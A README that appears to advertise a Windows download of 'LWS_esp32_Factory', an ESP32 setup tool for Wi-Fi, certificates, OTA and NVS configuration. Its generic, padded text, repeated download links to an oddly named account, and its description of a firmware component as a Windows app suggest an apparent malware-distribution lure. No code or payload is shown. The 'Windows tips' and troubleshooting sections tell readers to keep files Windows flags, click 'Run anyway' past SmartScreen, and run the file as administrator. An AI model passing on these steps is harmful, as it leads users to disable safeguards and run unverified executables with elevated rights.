# 🔧 LWS_esp32_Factory - Simple ESP32 setup and updates

[![Download](https://img.shields.io/badge/Download%20Now-5A67D8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/jordanian-leftventricle188/LWS_esp32_Factory)

## 📥 Download

Visit this page to download and run the app:
https://github.com/jordanian-leftventricle188/LWS_esp32_Factory

## 🖥️ What this app does

LWS_esp32_Factory is a factory app for ESP32 devices. It helps you set up the device, choose an access point, create certificates, run OTA updates, and get a Let's Encrypt certificate.

It stores settings in NVS, so the same device data can be used by the OTA app later.

## ✅ What you need

- A Windows PC
- A web browser
- An ESP32 device
- A USB cable for the ESP32
- Network access for setup and certificate steps
- Admin access on your PC if Windows blocks the file

## 🚀 Getting Started

1. Open this page in your browser:
   https://github.com/jordanian-leftventricle188/LWS_esp32_Factory

2. Find the latest release or download file on the page.

3. Download the app to your Windows computer.

4. If Windows asks if you want to keep the file, choose the option to keep it.

5. Open the downloaded file to start the app.

6. If the app opens in a browser window, keep that window open while you work with the ESP32.

## 🔌 Connect the ESP32

1. Plug the ESP32 into your Windows PC with a USB cable.

2. Wait for Windows to finish setting up the device.

3. If your board uses a driver, install it before you continue.

4. Open the app after the board is connected.

5. Select the correct COM port if the app asks for one.

## ⚙️ First setup

When the app opens, it helps you prepare the ESP32 for use.

You can use it to:

- Set device details
- Save configuration data
- Choose the access point the device should use
- Prepare the board for OTA updates
- Generate certificates for secure connections
- Request a Let's Encrypt certificate when needed

Keep the app open until the setup step finishes.

## 📶 Choose an access point

If the app asks you to pick a network:

1. Look at the list of available access points.

2. Select the one you want the device to use.

3. Enter the password if the network needs one.

4. Save the selection.

5. Wait for the device to confirm the change.

This step helps the ESP32 connect to the right network during normal use and update checks.

## 🔐 Certificate setup

The app can create and manage certificates for secure device communication.

During this step, you may need to:

- Enter the device name
- Choose a domain name
- Confirm certificate details
- Start the certificate request

If you use Let's Encrypt, make sure the domain points to the device or service you are setting up.

## 🔄 OTA update setup

OTA means the device can receive updates over the network.

In the app, you can:

1. Set the update details
2. Save the device configuration
3. Prepare the ESP32 for remote updates
4. Send the needed information to the OTA app

After setup, the device can use the saved NVS data to keep settings in sync.

## 🧭 Using the app day to day

Use LWS_esp32_Factory when you need to:

- Set up a new ESP32
- Change network settings
- Create or renew certificates
- Prepare OTA update support
- Move factory settings into a form the device can keep

If you plan to set up more than one device, repeat the same steps for each board.

## 🪟 Windows tips

- Right-click the downloaded file and choose Open if double-click does not work
- If SmartScreen blocks the app, choose More info, then Run anyway
- Keep the ESP32 connected while the app is running
- Close other serial tools that may use the same COM port
- Use a stable USB port on your PC

## 🛠️ Common problems

### The app does not open

- Download the file again
- Make sure the download finished
- Check if Windows blocked the file
- Try running it as administrator

### The ESP32 is not detected

- Unplug the board and plug it back in
- Try a different USB cable
- Try a different USB port
- Check the COM port list again
- Close any other app using the same port

### The network scan is empty

- Move the device closer to the router
- Check that Wi-Fi is on
- Try the scan again
- Make sure the antenna is attached, if your board uses one

### Certificate setup fails

- Check the domain name
- Make sure the device can reach the internet
- Confirm the time and date on the device
- Try the request again after fixing the network

## 📁 How the data is stored

The app saves configuration data in NVS on the ESP32.

That means:

- Settings stay on the device
- The OTA app can use the same values
- You do not need to enter the same details again
- Factory setup and update setup stay aligned

## 🔎 File and app behavior

LWS_esp32_Factory is built as a small factory tool for ESP32 work.

It is meant for:

- Initial device setup
- Secure config storage
- Network selection
- OTA preparation
- Certificate handling

It is not meant as a general desktop app for other tasks.

## 🧩 Suggested workflow

1. Download the app from the GitHub page
2. Connect the ESP32 to your Windows PC
3. Open the app
4. Set device details
5. Pick the access point
6. Create or request certificates
7. Save the settings to NVS
8. Prepare OTA update support
9. Keep the same data for the OTA app

## 📦 Download again

If you need the app later, use this link:
https://github.com/jordanian-leftventricle188/LWS_esp32_Factory

## 🧠 What to expect

The app should guide you through each step in a simple order. You do not need to know how ESP32 firmware works to use it. You just need the board, the app, and the right network details

## 📋 Quick checklist

- Windows PC ready
- ESP32 connected
- Downloaded the app
- Correct COM port selected
- Wi-Fi details ready
- Domain details ready for certificates
- OTA settings saved
- NVS data written to the device